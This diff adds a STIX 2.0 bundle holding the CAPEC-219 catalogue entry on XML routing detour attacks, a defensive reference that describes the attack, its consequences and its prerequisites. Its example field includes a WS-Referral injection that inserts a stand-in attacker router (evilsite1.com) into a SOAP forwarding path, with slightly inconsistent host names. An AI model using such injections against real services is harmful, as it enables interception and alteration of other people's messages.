@@ -1,0 +1,95 @@
+{
+    "type": "bundle",
+    "id": "bundle--118e0de3-ab9c-4975-b3c3-81e3ab99ecec",
+    "spec_version": "2.0",
+    "objects": [
+        {
+            "type": "attack-pattern",
+            "id": "attack-pattern--9b939586-fbef-4343-94f0-0046124e3e7f",
+            "created_by_ref": "identity--e50ab59c-5c4f-4d40-bf6a-d58418d89bcd",
+            "created": "2014-06-23T00:00:00.000Z",
+            "modified": "2017-08-04T00:00:00.000Z",
+            "name": "XML Routing Detour Attacks",
+            "description": "An attacker subverts an intermediate system used to process XML content and forces the intermediate to modify and/or re-route the processing of the content. XML Routing Detour Attacks are Man in the Middle type attacks. The attacker compromises or inserts an intermediate system in the processing of the XML message. For example, WS-Routing can be used to specify a series of nodes or intermediaries through which content is passed. If any of the intermediate nodes in this route are compromised by an attacker they could be used for a routing detour attack. From the compromised system the attacker is able to route the XML process to other nodes of his or her choice and modify the responses so that the normal chain of processing is unaware of the interception. This system can forward the message to an outside entity and hide the forwarding and processing from the legitimate processing systems by altering the header information.",
+            "external_references": [
+                {
+                    "source_name": "capec",
+                    "url": "https://capec.mitre.org/data/definitions/219.html",
+                    "external_id": "CAPEC-219"
+                },
+                {
+                    "source_name": "cwe",
+                    "url": "http://cwe.mitre.org/data/definitions/441.html",
+                    "external_id": "CWE-441"
+                },
+                {
+                    "source_name": "cwe",
+                    "url": "http://cwe.mitre.org/data/definitions/610.html",
+                    "external_id": "CWE-610"
+                },
+                {
+                    "source_name": "reference_from_CAPEC",
+                    "description": "WASC Threat Classification 2.0, 2010, The Web Application Security Consortium (WASC)",
+                    "url": "http://projects.webappsec.org/w/page/13246956/Routing-Detour",
+                    "external_id": "REF-80"
+                },
+                {
+                    "source_name": "reference_from_CAPEC",
+                    "description": "Andre Yee, Threat Protection in a Service Oriented World, NFR Security",
+                    "url": "http://www.unatekconference.com/images/pdfs/presentations/Yee.pdf",
+                    "external_id": "REF-81"
+                },
+                {
+                    "source_name": "reference_from_CAPEC",
+                    "description": "Pete Lindstrom, Attacking & Defending Web Services, 2002, SPiRE Security",
+                    "url": "http://www.webtorials.com/main/comnet/cn2003/web-service/24.pdf",
+                    "external_id": "REF-65"
+                }
+            ],
+            "object_marking_refs": [
+                "marking-definition--17d82bb2-eeeb-4898-bda5-3ddbcd2b799d"
+            ],
+            "x_capec_abstraction": "Standard",
+            "x_capec_consequences": {
+                "Access_Control": [
+                    "Bypass Protection Mechanism"
+                ],
+                "Accountability": [
+                    "Gain Privileges"
+                ],
+                "Authentication": [
+                    "Gain Privileges"
+                ],
+                "Authorization": [
+                    "Gain Privileges",
+                    "Bypass Protection Mechanism"
+                ],
+                "Confidentiality": [
+                    "Read Data"
+                ],
+                "Integrity": [
+                    "Modify Data"
+                ],
+                "Non-Repudiation": [
+                    "Gain Privileges"
+                ]
+            },
+            "x_capec_example_instances": [
+                "\n               <xhtml:p>Here is an example SOAP call from a client, example1.com, to a target, example4.com, via 2 intermediaries, example2.com and example3.com. (note: The client here is not necessarily a 'end user client' but rather the starting point of the XML transaction).</xhtml:p>\n               <xhtml:div style=\"margin-left:10px;\">\n                  <xhtml:div style=\"color:#32498D; font-weight:bold;\">Example SOAP message with routing information in header:</xhtml:div>\n                  <xhtml:div style=\"margin-left:10px;\">&lt;S:Envelope&gt; &lt;S:Header&gt; &lt;m:path xmlns:m=\"http://schemas.example.com/rp/\" S:actor=\"http://schemas.example.com/soap/actor\" S:mustUnderstand=\"1\"&gt; &lt;m:action&gt;http://example1.com/&lt;/m:action&gt; &lt;m:to&gt;http://example4.com/router&lt;/m:to&gt; &lt;m:id&gt;uuid:1235678-abcd-1a2b-3c4d-1a2b3c4d5e6f&lt;/m:id&gt; &lt;m:fwd&gt; &lt;m:via&gt;http://example2.com/router&lt;/m:via&gt; &lt;/m:fwd&gt; &lt;m:rev /&gt; &lt;/m:path&gt; &lt;/S:Header&gt; &lt;S:Body&gt; ... &lt;/S:Body&gt; &lt;/S:Envelope&gt;</xhtml:div>\n                  <xhtml:div>Add an additional node (example3.com/router) to the XML path in a WS-Referral message</xhtml:div>\n                  <xhtml:div style=\"margin-left:10px;\">&lt;r:ref xmlns:r=\"http://schemas.example.com/referral\"&gt; &lt;r:for&gt; &lt;r:prefix&gt;http://example2.com/router&lt;/r:prefix&gt; &lt;/r:for&gt; &lt;r:if/&gt; &lt;r:go&gt; &lt;r:via&gt;http://example3.com/router&lt;/r:via&gt; &lt;/r:go&gt; &lt;/r:ref&gt;</xhtml:div>\n               </xhtml:div>\n               <xhtml:div style=\"margin-left:10px;\" class=\"result\">\n                  <xhtml:div style=\"color:#32498D; font-weight:bold;\">Resulting in the following SOAP Header:</xhtml:div>&lt;S:Envelope&gt; &lt;S:Header&gt; &lt;m:path xmlns:m=\"http://schemas.example.com/rp/\" S:actor=\"http://schemas.example.com/soap/actor\" S:mustUnderstand=\"1\"&gt; &lt;m:action&gt;http://example1.com/&lt;/m:action&gt; &lt;m:to&gt;http://example4.com/router&lt;/m:to&gt; &lt;m:id&gt;uuid:1235678-abcd-1a2b-3c4d-1a2b3c4d5e6f&lt;/m:id&gt; &lt;m:fwd&gt; &lt;m:via&gt;http://example2.com/router&lt;/m:via&gt; &lt;m:via&gt;http://example3.com/router&lt;/m:via&gt; &lt;/m:fwd&gt; &lt;m:rev /&gt; &lt;/m:path&gt; &lt;/S:Header&gt; &lt;S:Body&gt;...&lt;/S:Body&gt; &lt;/S:Envelope&gt;</xhtml:div>\n               <xhtml:p>In the following example, the attacker injects a bogus routing node (using a WS-Referral service) into the routing table of the XML header but not access the message directly on the initiator/intermediary node that he/she has targeted.</xhtml:p>\n               <xhtml:div style=\"margin-left:10px;\" class=\"attack\">\n                  <xhtml:div style=\"color:#32498D; font-weight:bold;\">Example of WS-Referral based WS-Routing injection of the bogus node route:</xhtml:div>&lt;r:ref xmlns:r=\"http://schemas.example.com/referral\"&gt; &lt;r:for&gt; &lt;r:prefix&gt;http://example2.com/router&lt;/r:prefix&gt; &lt;/r:for&gt; &lt;r:if/&gt; &lt;r:go&gt; &lt;r:via&gt;http://evilsite1.com/router&lt;/r:via&gt; &lt;/r:go&gt; &lt;/r:ref&gt;</xhtml:div>\n               <xhtml:div style=\"margin-left:10px;\" class=\"result\">\n                  <xhtml:div style=\"color:#32498D; font-weight:bold;\">Resulting XML Routing Detour attack:</xhtml:div>&lt;S:Envelope&gt; &lt;S:Header&gt; &lt;m:path xmlns:m=\"http://schemas.example.com/rp/\" S:actor=\"http://schemas.example.com/soap/actor\" S:mustUnderstand=\"1\"&gt; &lt;m:action&gt;http://example_0.com/&lt;/m:action&gt; &lt;m:to&gt;http://example_4.com/router&lt;/m:to&gt; &lt;m:id&gt;uuid:1235678-abcd-1a2b-3c4d-1a2b3c4d5e6f&lt;/m:id&gt; &lt;m:fwd&gt; &lt;m:via&gt;http://example2.com/router&lt;/m:via&gt; &lt;m:via&gt;http://evilesite1.com/router&lt;/m:via&gt; &lt;m:via&gt;http://example3.com/router&lt;/m:via&gt; &lt;/m:fwd&gt; &lt;m:rev /&gt; &lt;/m:path&gt; &lt;/S:Header&gt; &lt;S:Body&gt; ... &lt;/S:Body&gt; &lt;/S:Envelope&gt;</xhtml:div>\n               <xhtml:p>Thus, the attacker can route the XML message to the attacker controlled node (and access to the message contents).</xhtml:p>\n            "
+            ],
+            "x_capec_likelihood_of_attack": "High",
+            "x_capec_prerequisites": [
+                "The targeted system must have multiple stages processing of XML content."
+            ],
+            "x_capec_resources_required": [
+                "The attacker must be able to insert or compromise a system into the processing path for the transaction."
+            ],
+            "x_capec_skills_required": {
+                "Low": "To inject a bogus node in the XML routing table"
+            },
+            "x_capec_status": "Draft",
+            "x_capec_typical_severity": "Medium",
+            "x_capec_version": "3.2"
+        }
+    ]
+}
